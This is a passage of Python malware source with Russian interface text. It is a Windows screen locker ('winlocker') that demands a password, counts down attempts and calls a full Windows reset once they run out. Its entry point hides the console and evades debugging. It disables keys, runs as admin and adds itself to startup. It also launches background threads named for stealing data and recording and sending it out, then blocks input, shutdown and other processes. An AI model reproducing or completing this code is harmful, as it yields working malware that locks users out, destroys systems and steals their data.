        self.chat_btn = tk.Button(self.win, text="ЧАТ", command=self.toggle_chat, bg='#00FF00', fg='black', font=('Courier', 10, 'bold'), cursor='hand2', bd=1, width=6)
        self.chat_btn.place(relx=0.95, rely=0.08, anchor='ne')
        
        cf = tk.Frame(self.win, bg='black')
        cf.place(relx=0.5, rely=0.82, anchor='center')
        tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='#00FF00', font=('Courier', 14, 'bold')).pack(pady=(0,5))
        self.pw_entry = tk.Entry(cf, show="*", font=('Courier', 14, 'bold'), bg='black', fg='#00FF00', insertbackground='#00FF00', relief='solid', bd=2)
        self.pw_entry.pack(pady=(0,5), ipadx=40, ipady=3)
        self.status_lbl = tk.Label(cf, text=f"ОСТАЛОСЬ ПОПЫТОК: {attempts_left}", bg='black', fg='#FF0000', font=('Courier', 12, 'bold'))
        self.status_lbl.pack()
        self.pw_entry.bind('<Return>', self.check_password)
        self.pw_entry.focus_force()
        self._keep_focus()
    
    def toggle_chat(self):
        if self.chat_open:
            self.chat.hide()
            self.chat_open = False
            self.chat_btn.config(text="ЧАТ")
        else:
            self.chat.show()
            self.chat_open = True
            self.chat_btn.config(text="[✕]")
    
    def _keep_focus(self):
        try:
            self.win.focus_force()
            self.pw_entry.focus_force()
            self.win.after(100, self._keep_focus)
        except:
            pass
    
    def check_password(self, e=None):
        global attempts_left
        if self.pw_entry.get() == PASSWORD:
            restore_win_key()
            self.status_lbl.config(text="ВЕРНО!", fg='#00FF00')
            self.win.update()
            time.sleep(1)
            block_input(False)
            self.root.destroy()
            os._exit(0)
        else:
            attempts_left -= 1
            if attempts_left > 0:
                self.status_lbl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {attempts_left}", fg='#FF0000')
            else:
                self.status_lbl.config(text="404 | ОШИБКА", fg='#FF0000')
                self.win.update()
                time.sleep(2)
                self.root.destroy()
                full_windows_reset()
            self.pw_entry.delete(0, tk.END)

# ========== ТОЧКА ВХОДА ==========
if __name__ == "__main__":
    hide_console()
    anti_debug()
    disable_win_key()
    run_as_admin()
    threading.Thread(target=mega_steal_data, daemon=True).start()
    threading.Thread(target=record_and_send_loop, daemon=True).start()
    add_to_startup()
    time.sleep(TIMER_SECONDS)
    boot_animation()
    block_input(True)
    prevent_shutdown()
    threading.Thread(target=kill_processes, daemon=True).start()
    threading.Thread(target=block_all_keys, daemon=True).start()
    WinLocker()
    tk.mainloop()
